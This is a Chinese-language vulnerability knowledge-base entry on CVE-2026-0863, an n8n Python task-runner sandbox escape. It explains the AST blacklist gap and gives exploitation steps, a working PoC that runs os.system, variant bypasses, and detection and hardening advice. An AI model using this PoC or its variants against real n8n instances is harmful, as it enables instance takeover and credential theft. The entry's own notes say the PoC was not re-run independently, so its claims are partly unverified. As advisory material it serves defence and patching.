---
id: web-nodejs-n8n-python-task-runner-eobj-sandbox-escape-rce
title: n8n Python 任务运行器 AST 黑名单漏掉 obj：e.obj 取回未过滤 builtins，字符串格式化绕过 __import__ 检测 RCE（CVE-2026-0863）
type: scenario
domain: web
path: web/nodejs
technique: n8n-python-task-runner-eobj-builtins-sandbox-escape
tags:
- n8n
- nodejs
- python
- sandbox-escape
- rce
- ast
- builtins
- authenticated
- cve-2026-0863
cve:
- CVE-2026-0863
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: < 1.123.14, 2.0.0 <= n8n < 2.3.5, 2.4.0 <= n8n < 2.4.2
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T11:52:55+08:00'
  notes: 已对照原文与 10 张图核对：NVD CVE-2026-0863（CVSS 8.5、版本区间）、task_analyzer.py validate/visit_Attribute/visit_Call、constants.py BLOCKED_ATTRIBUTES（缺 obj）、task_executor.py _wrap_code/_all_items/_filter_builtins、修复 diff 增加 obj 及 e.obj/exception.obj/error.obj 测试均一致；versions 按原文区间设置。未验证点：原文无成功执行截图，"e.obj 返回未过滤 builtins"一句与截图里 __builtins__ 为过滤字典存在细节张力，PoC 未独立复跑。
url: /docs/web/nodejs/web-nodejs-n8n-python-task-runner-eobj-sandbox-escape-rce/
draft: false
kb_aliases:
- CVE-2026-0863
- n8n Python 沙箱逃逸
- n8n task-runner-python RCE
- e.obj 绕过 BLOCKED_ATTRIBUTES
- n8n Code block RCE
---

## 一句话结论

n8n 的 Python 任务运行器用 AST 黑名单限制 Code 块，但 `BLOCKED_ATTRIBUTES` 没有 `obj`：攻击者故意触发 `__builtins__.__secret__` 的 `AttributeError`，从异常对象 `e.obj` 取回真实的 builtins 模块，再用 `"{}.__import__('os')".format(...)` 这种字符串格式化调用绕过只识别直接 `__import__()` 的检查，最终在运行器进程/容器中执行任意 Python 代码（CVE-2026-0863，CVSS 8.5）。

## 原理

- **入口**：拥有基本权限的已认证用户可在工作流的 Code 块提交 Python 代码；`task-runner-python` 的 `TaskAnalyzer.validate()` 先用 `ast.parse()` 建树，再由 `SecurityValidator` 做黑名单检查。
- **黑名单缺项**：`constants.py` 的 `BLOCKED_ATTRIBUTES` 包含 `__builtins__`、`__class__`、`__subclasses__`、`__globals__`、`__import__` 等，却没有 CPython 异常对象上的 `obj` 属性（`AttributeError.obj`，3.10+ 提供）。
- **异常对象泄露真实 builtins**：代码执行 `__builtins__.__secret__` 时，`__builtins__` 指向被 `_filter_builtins()` 过滤后的字典，但访问不存在的 `__secret__` 会抛出 `AttributeError`；异常对象的 `.obj` 指向发生属性访问的对象，即未过滤的 builtins 模块/字典。`except AttributeError as e: e.obj` 因此绕过了 `_filter_builtins` 的过滤。
- **动态导入检测缺口**：`visit_Call` 只识别 `__import__("x")`（`ast.Name` + `Constant` 参数）与 `builtins.__import__("x")`/`__builtins__.__import__("x")`；攻击者把 `__import__` 作为值放进字符串模板 `"{}.__import__('os')".format(ref)`，生成一个可调用字符串再 `("os")` 调用，AST 中不存在直接 `__import__` 调用节点，检查被绕过。
- **执行**：`TaskExecutor._all_items()` 把用户代码包进 `def _user_function(): ...`，用过滤后的 `globals`（`__builtins__` 为白名单字典）`exec`。由于 `e.obj` 已取到真实 builtins，`__import__('os')` 成功导入 os，`os.system()` 以运行器进程用户身份执行命令。
- **影响范围**：`internal` 执行模式下命令落在 n8n 主节点，可完全接管实例（读取加密密钥、凭据、工作流数据）；官方 Docker 等 `external` 模式下落在 sidecar 容器，影响降低但仍可窃取运行器可见的数据。
- **修复**：在 `BLOCKED_ATTRIBUTES` 中加入 `"obj"`，并补充 `e.obj`/`exception.obj`/`error.obj` 的回归测试；升级到 1.123.14 / 2.3.5 / 2.4.2 及以上。

## 触发条件

- n8n 版本满足：`< 1.123.14`，或 `2.0.0 <= n8n < 2.3.5`，或 `2.4.0 <= n8n < 2.4.2`。
- 攻击者拥有可编辑/执行工作流 Code 块的基本账号（已认证）。
- 实例启用 Python 任务运行器（`N8N_RUNNERS_ENABLED` 等配置），Code 块可选择 Python。
- 运行器进程/容器对外有命令执行所需的权限（读取配置、网络等）。

## 利用步骤

1. 登录 n8n，新建工作流，添加 Code 块并选择 Python。
2. 写入利用代码：触发 `__builtins__.__secret__`，在 `except AttributeError as e` 中取 `e.obj`，用字符串格式化拿到 `__import__` 并导入 `os`，执行命令。
3. 运行工作流；命令在 task-runner-python 进程（internal 模式为主节点，external 模式为 sidecar）执行。
4. 用无害命令验证（如 `id > /tmp/pwned`），随后读取运行器可访问的配置/凭据，评估影响范围。
5. 授权测试只在自建 n8n 实例进行，不读取真实用户数据。

## PoC

```python
import json

def process_item(item):
    data = json.loads(item.json)
    try:
        __builtins__.__secret__          # 触发 AttributeError
    except AttributeError as e:
        builtins_ref = e.obj              # 未过滤的 builtins
        import_code = "{}.__import__('os')"
        os_module = import_code.format(builtins_ref.__import__)("os")  # 绕过 AST 检查
        os_module.system('id > /tmp/exploited')
    return {"status": "success"}
```

说明：原文给出该 Code 块载荷与漏洞链；未在本机 n8n 实例复跑。

## 变体与关联

- **异常属性变体**：`exception.obj`、`error.obj`、其他异常类型上的 `.obj`；修复只加 `obj` 后，可关注其他未列入黑名单的异常/内省属性。
- **动态导入变体**：`getattr(builtins_ref, "__import__")`、`builtins_ref.__dict__["__import__"]`、字符串拼接/格式化/`eval` 组合，绕过只匹配直接调用的 AST 规则。
- **运行模式差异**：internal 模式直接接管主节点；external 模式限制在 sidecar，但仍可读取 sidecar 环境变量、挂载卷与网络可达服务。
- **关联**：[[web-nodejs-n8n-expression-sandbox-escape-rce]]（JS 表达式沙箱逃逸）、[[web-nodejs-n8n-expression-destructuring-constructor-rce-cve-2026-25049]]（表达式构造器绕过）、[[web-nodejs-n8n-authenticated-execute-command-workflow-rce]]（已认证工作流命令执行）。

## 检测与防御

- **升级**：升级到 1.123.14、2.3.5、2.4.2 或更高；确认 `BLOCKED_ATTRIBUTES` 包含 `obj`。
- **沙箱加固**：不要把 AST 黑名单作为唯一防线；运行器使用独立低权限用户/容器，禁止访问宿主 docker.sock、云凭据与 n8n 主节点密钥；限制出站网络。
- **最小权限**：只给需要 Code 块的账号开放工作流执行权限；生产环境尽量使用 external 模式。
- **检测**：审计 Code 块中的 `e.obj`、`exception.obj`、`__builtins__`、`__import__`、`os.system`、`subprocess` 等模式；监控运行器进程的异常子进程、临时文件与对外连接；告警工作流中出现命令执行特征。
- **响应**：若已执行，隔离运行器/节点，轮换 n8n 加密密钥、凭据与 API Key，检查工作流与审计日志，清理 `/tmp` 落地文件并升级。
